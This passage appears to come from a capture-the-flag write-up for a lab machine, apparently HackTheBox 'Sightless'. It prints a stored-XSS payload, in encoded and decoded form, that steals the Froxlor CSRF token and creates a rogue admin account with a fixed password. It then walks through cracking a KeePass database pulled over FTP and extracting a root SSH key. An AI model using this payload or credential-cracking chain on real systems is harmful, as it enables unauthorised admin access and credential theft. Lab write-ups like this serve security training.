admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```

Decoded it is:

```
admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]')
var csrfToken=metaTag.getAttribute('content')
var xhr=new XMLHttpRequest()
var url="https://demo.froxlor.org/admin_admins.php"
var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token=" csrfToken "&page=admins&action=add&send=send"
xhr.open("POST",url,true)
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")
alert("Your Froxlor Application has been completely Hacked")
xhr.send(params)}
a=b()`()}}
```

{% endraw %}

Change the url to the relevant url, ie **admin.sightless.htb:8080**, and as mentioned in the advisory place the recoded payload into the loginname parameter on login and it will create an admin user. Username is `abcd` and the password of the new user is `Abcd@@1234`. This is the intended way to get onto the Froxlor application, and the debugger in theory is being run to automate the admin checking the admin portal for the XSS to detonate. 

## FTP

Next if you check the customers tab we can see John Thompson has a username of web1, and we can change web1's password after clicking on the name and heading to FTP -> Accounts. Use the options to change the password and FTP into it with `web1:youpass`.

Inside of FTP you will find a password backup file at */goaccess/backup/Database.kdb* and using `get Database.kdb` retrieves it. Next run `keepass2john` and run john or hashcat to crash the hash. Then run the following:

```bash
kpcli -kdb Database.kdb
find .
show /General/sightless.htb/Backup/ssh -f
attach /General/sightless.htb/Backup/ssh

dos2unix id_rsa
ssh -i id_rsa root@sightless.htb
```

